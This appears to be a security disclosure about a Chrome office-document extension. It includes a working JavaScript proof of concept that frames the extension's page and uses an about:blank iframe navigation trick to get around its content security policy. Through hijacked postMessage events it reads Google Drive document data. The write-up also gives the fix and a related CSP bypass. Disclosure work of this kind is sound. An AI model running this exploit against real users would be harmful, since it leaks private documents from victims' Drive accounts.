### Details

- **Replace `msofficeDocId` with the doc ID of a `pptx`/`docx` file you uploaded to google drive**
- It does not need to be shared with anyone.
- 3rd party cookies are required to be enabled however with browser heuristics this can be automatic for example it gets allowed if you open and interact with a popup on Chrome.

```js
let msofficeDocId = '1DuGHZhNFjJFCtOXVkA91t5o92Y3BRJ1u';

setInterval(() => {
  if (window.f) document.body.removeChild(f);
  f = document.createElement('iframe');
  f.width = 500;
  f.height = 500;
  f.src =
    'chrome-extension://gbkeegbaiigmenfmjfclcdgdpimamgkj/views/app.html?state=%7B"ids":%5B"' +
    msofficeDocId +
    '"%5D,"action":"open","resourceKeys":%7B%7D%7D';

  document.body.appendChild(f);

  let loop = setInterval(() => {
    // Wait for iframes to load
    if (f.contentWindow.length !== 2) return;
    clearInterval(loop);

    setTimeout(() => {
      f.contentWindow[0].location = 'about:blank';
      let loop2 = setInterval(() => {
        try {
          // Monitor for leaks via onmessage
          f.contentWindow[0].onmessage = (e) => {
            console.log('Data leaked :) ' + JSON.stringify(e.data));
          };
          clearInterval(loop2);
        } catch {}
      }, 0);
      // Wait a bit for the sandbox to request document content
    }, 600);
  }, 0);

  // Retry ever 2 seconds
}, 2000);
```

This issue was fixed by adding `frame-ancestors 'self'` to the `extension_pages` content security policy.

### Attack scenario

Attacker websites can leak data from a user's google drive if they know the doc id.

# frame-src 'self' bypass

Because of an `about:blank` edge case it's possible to navigate a nested, nested 3rd party iframe to it and bypass the child's CSP.  
This has resulted in leaking data due to the victim sending sensitive information to a iframe using the `*` scope that can be hijacked via good navigation timings even with the CSP.  
A GitHub issue was opened about this <https://github.com/w3c/webappsec-csp/issues/662>
